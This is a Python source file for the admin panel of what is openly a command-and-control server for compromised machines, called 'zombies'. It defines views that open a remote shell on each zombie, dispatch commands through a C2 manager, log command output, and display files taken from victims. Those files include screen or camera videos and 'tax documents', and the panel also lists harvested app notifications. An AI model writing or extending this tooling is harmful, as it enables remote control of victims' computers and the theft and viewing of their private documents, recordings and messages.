from markupsafe import Markup
from sqladmin import ModelView, expose
from sqlalchemy import select
from sqlalchemy.orm import selectinload
from starlette.requests import Request

from apps.zombie.models import Zombie, Command, Log, File, Notification
from config.database import async_session_maker


class ZombieAdmin(ModelView, model=Zombie):
    column_list = [Zombie.id, Zombie.unique_key, Zombie.status, Zombie.os_name, "open_shell"]
    column_searchable_list = [Zombie.os_name, ]

    name = "Zombie"
    name_plural = "Zombies"
    icon = "fa-solid fa-biohazard"

    column_formatters = {

        Zombie.status: lambda m, a: Markup(
            f'<span style="display: flex; align-items: center;">'
            f'<span style="height: 10px; width: 10px; background-color: {"#28a745" if m.status == "online" else "#dc3545"}; '
            f'border-radius: 50%; display: inline-block; margin-right: 8px;"></span>'
            f'{m.status.capitalize()}</span>'
        ),
        "open_shell": lambda m, a: Markup(
            # Use a relative path to avoid prefix issues
            f'<a class="btn btn-sm btn-dark" href="terminal/{m.id}">'
            f'<i class="fa fa-terminal"></i> Open Shell</a>'
        ),
    }

    @expose("/terminal/{id}", methods=["GET"])
    async def terminal_page(self, request: Request):
        zombie_id = request.path_params["id"]

        # You MUST await this call
        return await self.templates.TemplateResponse(
            request,  # Pass request as the first argument
            "terminal.html",
            {"zombie_id": zombie_id}
        )


class CommandAdmin(ModelView, model=Command):
    column_list = [
        Command.id,
        "zombie",  # Uses Zombie.__str__
        "command_type",
        "status"
    ]
    # Forces JOIN so Zombie.__str__ doesn't crash the list view
    column_select_related_list = [Command.zombie]

    name = "Command"
    name_plural = "Commands"
    icon = "fa-solid fa-code"

    async def after_model_change(self, data: dict, model: Command, is_created: bool, request: Request) -> None:
        from managers.c2_manager import c2_manager
        # print(data)

        if is_created:
            async with async_session_maker() as session:
                # Optimized: session.get is cleaner for ID lookups
                full_command = await session.get(
                    Command, 
                    model.id, 
                    options=[selectinload(Command.zombie)]
                )

                if full_command:
                    payload = {
                        "action":'exec',
                        "command_type": full_command.command_type,
                        "command_id": str(full_command.id), # UUIDs/BigInts are safer as strings in JSON
                    }

                    # Dispatching INSIDE the session block ensures data integrity
                    await c2_manager.send_command(str(full_command.zombie_id), payload)
                    print(f"[*] Command #{full_command.id} dispatched to Zombie {full_command.zombie_id}")
                else:
                    print(f"[!] Failed to re-fetch command {model.id}")


class LogAdmin(ModelView, model=Log):
    column_list = [
        Log.id,
        "zombie",
        "command",
        Log.output_data
    ]

    column_select_related_list = [Log.zombie, Log.command]
    column_searchable_list = [Log.output_data]
    column_default_sort = ("id", True)

    name = "Command Log"
    name_plural = "Command Logs"
    icon = "fa-solid fa-terminal"

    # This ensures that when you view the log, it handles long text correctly
    column_details_list = [Log.id, "zombie", "command", Log.output_data]

    column_formatters = {
        Log.output_data: lambda m, a: (m.output_data[:50] + "...") if m.output_data and len(
            m.output_data) > 50 else m.output_data
    }

    # 2. Show as pre-formatted text in the DETAILS/VIEW page
    # This preserves newlines (\n) from the terminal output
    def on_model_change(self, data, model, is_created, request):
        pass

    column_formatters_detail = {
        Log.output_data: lambda m, a: Markup(
            f'<pre style="white-space: pre-wrap; background: #f4f4f4; color:black; padding: 10px; border-radius: 5px;">{m.output_data}</pre>') if m.output_data else ""
    }


class FileAdmin(ModelView, model=File):
    column_list = [
        File.id,
        File.name,
        "zombie",
        "command",
    ]

    column_select_related_list = [File.zombie, File.command]
    column_searchable_list = [File.name]
    column_default_sort = ("id", True)

    name = "Zombie File"
    name_plural = "Zombie Files"
    icon = "fa-solid fa-file"

    # This ensures that when you view the log, it handles long text correctly
    column_details_list = [File.id, File.name, File.file_path, "zombie", "command", ]
    column_formatters_detail = {
        File.file_path: lambda m, a: (
            lambda path_clean=m.file_path.replace("\\", "/").replace("media/", "").replace("_mp4", ".mp4").lstrip(
                "/"): Markup(
                f'''
                <div style="background: #000; padding: 10px; border-radius: 8px; display: inline-block;">
                    <video width="640" height="360" controls style="display: block;">
                        <source src="/static/{path_clean}" type="video/mp4">
                        Your browser does not support the video tag.
                    </video>
                </div>
                <br>
                <a href="/static/{path_clean}" target="_blank" class="btn btn-info mt-2">
                    <i class="fa fa-external-link"></i> Open Video in New Tab
                </a>
                '''
            )
        )() if m.file_path and (m.file_path.lower().endswith(('.mp4', '_mp4')))
        else open_and_read_file(m.file_path)
    }


class NotificationAdmin(ModelView, model=Notification):
    column_list = [
        Notification.id,
        Notification.zombie,
        Notification.app_name,
        Notification.title,
        Notification.output_data
    ]

    # Added branding and icon here
    name = "Notification"
    name_plural = "Notifications"
    icon = "fa-solid fa-bell"  # This adds the bell icon to the sidebar


def get_file_url(db_path: str) -> str:
    """Generates the URL for the browser player."""
    if not db_path:
        return ""
    # Convert backslashes to forward slashes
    # Python 3.10 compatible: logic outside the f-string
    url_path = db_path.replace("\\", "/")

    # Strip 'media/' prefix if it exists because our mount is ALREADY at 'media'
    if url_path.startswith("media/"):
        url_path = url_path[len("media/"):]

    return f"/static/{url_path}"


def open_and_read_file(db_path):
    import os
    from pathlib import Path
    from markupsafe import Markup

    if not db_path:
        return "No path provided."

    # 1. Normalize path: handle the extension dot issue we saw earlier
    normalized = db_path.replace('\\', '/')
    if normalized.endswith('_mp4'):  # Keep this if you still have video IDs
        normalized = normalized[:-4] + '.mp4'

    full_path = Path(os.getcwd()) / normalized

    if not full_path.exists():
        return Markup(f'<span style="color:red;">File not found at: {full_path}</span>')

    try:
        # 2. Read a larger chunk for tax documents (e.g., 5000 characters)
        with open(full_path, "r", encoding="utf-8") as f:
            content = f.read(5000)

            # 3. Return a "Big" styled view
        return Markup(f'''
            <div style="
                background: #ffffff; 
                color: #333; 
                padding: 30px; 
                border: 1px solid #ccc; 
                border-radius: 4px; 
                font-family: 'Courier New', Courier, monospace; 
                font-size: 14px; 
                line-height: 1.6;
                white-space: pre-wrap;
                height: 600px;
                overflow-y: scroll;
                box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
            ">
                <h4 style="border-bottom: 2px solid #333; padding-bottom: 10px;">DOCUMENT PREVIEW</h4>
                {content}
            </div>
        ''')
    except Exception as e:
        return f"Could not read tax document: {e}"
